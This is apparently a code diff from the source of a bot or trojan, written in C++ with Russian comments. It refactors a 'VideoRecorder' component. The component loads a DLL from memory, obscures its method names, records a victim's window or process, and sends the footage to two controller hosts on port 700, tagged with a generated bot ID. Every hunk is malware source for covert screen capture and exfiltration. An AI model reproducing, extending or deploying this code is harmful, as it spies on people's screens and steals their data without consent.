@@ -63,9 +63,6 @@ namespace VideoRecorder
     char MethodStartRecordPid[] = {'S','t','a','r','t','R','e','c','P','i','d', 0};
     char MethodStop[]           = {'S','t','o','p','R','e','c', 0};
 
-	// порт сервера приёма видео
-    const DWORD DEFAULT_PORT = 700;
-
 
 	// Функция загружает библиотеку
 	HMEMORYMODULE inline LoadDLL();
@@ -137,7 +134,7 @@ void StartRecordThread(DWORD pid,PCHAR KeyWord, PCHAR ip, PCHAR ReservedIP, int 
 	};
 }
 
-void StartSendThread(PCHAR Path,PCHAR ip, PCHAR ReservedIP, int port)//стартуем поток отправки
+void VideoRecorderSendPath(PCHAR Path,PCHAR ip, PCHAR ReservedIP, int port)//стартуем поток отправки
 {
 	VDRDBG("VIDEO","слать даные из %s",Path);
 	HMEMORYMODULE	hLibWndRec1 = VideoRecorder::LoadDLL();;
@@ -157,6 +154,8 @@ void StartSendThread(PCHAR Path,PCHAR ip, PCHAR ReservedIP, int port)//стартуем 
 				ip = GetVideoRecHost1();
 			if (ReservedIP == NULL)
 				ReservedIP = GetVideoRecHost2();
+			if (!port)
+				port = VIDEORECORD_DEFAULT_PORT;
 
 			//Здесь надо получить второй айпи и порт(резервный)
 			VDRDBG("VIDEO","Все готово запускаем(жмем и отрправляем данные) %s",ip);
@@ -184,11 +183,12 @@ DWORD WINAPI StartSendinThread(LPVOID Data)
 	}
 
 	VDRDBG("VIDEO","полученное имя %s",Path_Folder);
-	StartSendThread(Path_Folder,NULL,NULL, 700);
+	VideoRecorderSendPath(Path_Folder,NULL,NULL, 700);
 	return 0;
 
 }
 //---------------------------------------------------------------------------------
+
 void StartRecordThread1(HWND hWnd,PCHAR KeyWord,PCHAR ip, PCHAR ReservedIP, int port)//стартуем поток записи видео
 {
 	VDRDBG("VIDEO","Начинаем запись по хендлу окна");
@@ -419,7 +419,7 @@ namespace VideoRecorderSrv
 		// Инициализируем параметры запуска
 		PCHAR IP1 = GetVideoRecHost1();
 		PCHAR IP2 = GetVideoRecHost2();
-		int Port  = VideoRecorder::DEFAULT_PORT;
+		int Port  = VIDEORECORD_DEFAULT_PORT;
 		PCHAR UID = GenerateBotID();
 
 		// запускаем запись
